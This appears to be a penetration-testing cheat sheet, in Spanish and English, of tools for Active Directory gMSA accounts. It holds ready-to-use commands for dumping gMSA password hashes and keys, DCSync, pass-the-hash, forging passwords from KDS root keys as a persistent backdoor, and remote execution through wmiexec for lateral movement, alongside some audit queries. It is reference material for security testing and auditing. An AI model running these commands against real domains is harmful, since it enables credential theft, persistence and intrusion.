---
aliases:
  - gMSA Tooling
  - gMSADumper
  - GoldenGMSA
  - DSInternals gMSA
tags:
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[AD - gMSA Enumeration]]"
  - "[[netexec]]"
---
# AD - gMSA Enumeration - Tooling

---

## netexec / crackmapexec

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc ldap <DC> -u u -p p --gmsa` | Bulk dump (NT hash + Kerberos keys) | Standard quick. |
| `nxc ldap <DC> -u u -p p -H <NT-hash> --gmsa` | PtH auth | Sin password. |
| `nxc ldap <DC> -u u -p p -k --gmsa` | Kerberos auth (TGT) | OPSEC. |
| `nxc ldap <DC> -u u -p p --query "(objectClass=msDS-GroupManagedServiceAccount)" "*"` | Discovery custom | Targeted. |
^ad-gmsa-tool-netexec

---

## gMSADumper (Python)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `python3 gMSADumper.py -u u -p pass -d corp.local -l <DC>` | Bulk dump cleartext + NT + Kerberos | Linux standard. |
| `python3 gMSADumper.py -u u --hashes :NT -d corp.local -l <DC>` | PtH auth | Sin password. |
| `python3 gMSADumper.py -u u -p pass -d corp.local -l <DC> -k -no-pass` | Kerberos | OPSEC. |
^ad-gmsa-tool-gmsadumper

```bash
git clone https://github.com/micahvandeusen/gMSADumper
pip install -r gMSADumper/requirements.txt
python3 gMSADumper/gMSADumper.py -u auditor -p 'Pass!' -d corp.local -l <DC>
```

---

## GoldenGMSA

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `GoldenGMSA.exe gmsainfo --sid <gmsa-SID>` | Read gMSA metadata | Pre-attack. |
| `GoldenGMSA.exe kdsinfo` | Read KDS Root Keys (priv DA) | Required para forge. |
| `GoldenGMSA.exe compute --kdskey <key> --sid <gmsa-SID> --pwdid <managed-pwd-id>` | Compute pwd offline | **Persistent backdoor**. |
^ad-gmsa-tool-goldengmsa

```bash
# Download release
wget https://github.com/Semperis/GoldenGMSA/releases/latest/download/GoldenGMSA.exe

# Pre-attack info
GoldenGMSA.exe kdsinfo > kds.json
GoldenGMSA.exe gmsainfo --sid S-1-5-21-... > gmsa.json

# Forge offline
GoldenGMSA.exe compute --kdskey "..." --sid "..." --pwdid "..."
```

---

## DSInternals (PowerShell)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Install-Module DSInternals` | Install módulo | Setup. |
| `Get-ADReplAccount -SamAccountName 'gMSA$' -Server <DC>` | DCSync via LDAP-replication | Privileged. |
| `ConvertFrom-ADManagedPasswordBlob $blob` | Decode `msDS-ManagedPassword` blob | Parse. |
| `Get-ADDBAccount -All -DBPath ntds.dit -BootKey ...` | Offline NTDS parse (incluye gMSAs) | Forensic. |
| `ConvertTo-NTHash -Password $sec` | NT hash desde SecureString | Helper. |
^ad-gmsa-tool-dsinternals

```powershell
Import-Module DSInternals

# Read + decode gMSA blob
$gmsa = Get-ADServiceAccount "SQL_gMSA" -Properties msDS-ManagedPassword
$pwd = ConvertFrom-ADManagedPasswordBlob $gmsa.'msDS-ManagedPassword'
$pwd.SecureCurrentPassword | ConvertTo-NTHash
```

---

## Native PowerShell (RSAT)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADServiceAccount -Filter *` | All gMSAs/sMSAs | Inventory. |
| `Get-ADServiceAccount <name> -Properties *` | Detail completo | Per-gMSA audit. |
| `Get-ADServiceAccount -Filter * -Pr PrincipalsAllowedToRetrieveManagedPassword,MemberOf,ServicePrincipalName,AdminCount` | Audit attrs | Standard. |
| `Test-ADServiceAccount <gmsa>` | Validar usable desde host | Permission test. |
| `Install-ADServiceAccount <gmsa>` (priv) | Install on host | Setup. |
| `Get-KdsRootKey` | KDS Root Keys (priv) | Forensic. |
^ad-gmsa-tool-rsat

---

## BloodHound gMSA

| **Cypher** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `MATCH (s {gmsa:true}) RETURN s.name,s.domain` | All gMSAs | Inventory. |
| `MATCH (u {owned:true})-[:ReadGMSAPassword*1..]->(s) RETURN u.name,s.name` | Paths owned → gMSA read | Privesc. |
| `MATCH (s {gmsa:true})-[:MemberOf*1..]->(g:Group {highvalue:true}) RETURN s.name,g.name` | gMSAs en Tier 0 | Critical. |
| `MATCH (u:User)-[:MemberOf*1..]->(g:Group)-[:ReadGMSAPassword]->(s) RETURN u,g,s` | Recursive readers | Detail. |
^ad-gmsa-tool-bh

```bash
# SharpHound captures gMSA edges automáticamente
.\SharpHound.exe -c All
# o
bloodhound-python -d corp.local -u u -p p -ns <DC> -c All --zip
```

---

## Linux / Impacket

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `python3 gMSADumper.py -u u -p pass -d corp.local -l <DC>` | Standard Linux dump | Standard. |
| `secretsdump.py corp.local/admin:pass@<DC> -just-dc-user '<gMSA>$'` | DCSync gMSA hash (priv) | Privileged. |
| `bloodyAD --host <DC> -d corp -u u -p pass get object '<gMSA-DN>' --attr msDS-ManagedPassword` | Raw blob | Linux read. |
| `getTGT.py corp.local/'<gMSA>$' -hashes :<NT> -dc-ip <DC>` | TGT como gMSA | Auth post-dump. |
| `wmiexec.py -hashes :<NT> 'corp.local/<gMSA>$@<target>'` | RCE como gMSA | Lateral. |
^ad-gmsa-tool-linux

---

## Recursos

| **Recurso** | **URL** |
|:---:|:---:|
| gMSADumper | `https://github.com/micahvandeusen/gMSADumper` |
| GoldenGMSA | `https://github.com/Semperis/GoldenGMSA` |
| DSInternals | `https://github.com/MichaelGrafnetter/DSInternals` |
| Microsoft gMSA docs | `https://learn.microsoft.com/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview` |
| MS-GKDI spec (KDS / gMSA crypto) | `https://learn.microsoft.com/openspecs/windows_protocols/ms-gkdi/` |
| HackTricks gMSA | `https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/account-persistence` |
| Akamai BadSuccessor (dMSA abuse) | `https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory` |
| The Hacker Recipes — gMSA | `https://www.thehacker.recipes/ad/movement/credentials/dumping/gmsa` |
^ad-gmsa-tool-resources

---
